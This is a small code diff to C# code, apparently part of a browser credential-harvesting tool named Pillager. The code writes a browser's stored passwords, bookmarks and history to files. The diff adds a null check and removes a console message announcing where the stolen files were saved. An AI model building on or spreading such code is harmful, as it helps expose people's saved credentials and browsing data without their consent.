@@ -244,7 +244,7 @@ namespace Pillager.Browsers
             {
                 try
                 {
-                    urls[i] = myreg.GetValue("url" + i.ToString()).ToString();
+                    urls[i] = myreg.GetValue("url" + i.ToString())?.ToString();
                 }
                 catch { }
             }
@@ -289,7 +289,6 @@ namespace Pillager.Browsers
             if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
             if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
             if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
-            Console.WriteLine("Files wrote to " + savepath);
         }
     }
 }
